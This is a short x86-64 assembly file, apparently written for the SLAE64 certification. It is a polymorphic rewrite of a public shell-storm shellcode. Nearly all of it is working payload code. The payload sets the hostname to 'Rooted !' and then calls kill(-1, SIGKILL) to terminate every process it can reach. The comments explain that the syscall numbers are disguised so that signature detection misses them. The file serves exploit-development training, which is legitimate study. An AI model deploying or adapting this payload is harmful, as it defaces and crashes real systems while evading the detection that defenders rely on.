; the modification here is not that much: i want to prevent any "easily spottable" syscall id
; original url    : http://shell-storm.org/shellcode/files/shellcode-605.php
; original length : 33
; morphed length  : 35
; original author : zbt
; morphed author  : Sandro "guly" Zaccarini SLAE64-1497

  section .text
  global _start
  _start:
;-- setHostName("Rooted !"); 22 bytes --;
; the author did not xored, nor do i
; to achieve 1)
add al,0x8
xor sil,al

; to achieve 2)
;mov     al, 0xaa <= this was 2)
add     al, 0xa2
mov     r8, 'Rooted !'
push    r8
mov     rdi, rsp
; mov     sil, 0x8 <= this was 1)
syscall

;-- kill(-1, SIGKILL); 11 bytes --;
; to achieve 3)
; i know rax is 0x0 and i know r8b is 0x52
xor al,r8b
xor al,0x6c
; push    byte 0x3e <= these was 3)
; pop     rax       <=

push    byte 0xff
pop     rdi
; because rsi is 0x8, i can just inc and achieve 4)
inc rsi
; push    byte 0x9 <= this was 4)
; pop     rsi      <=
syscall

; This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
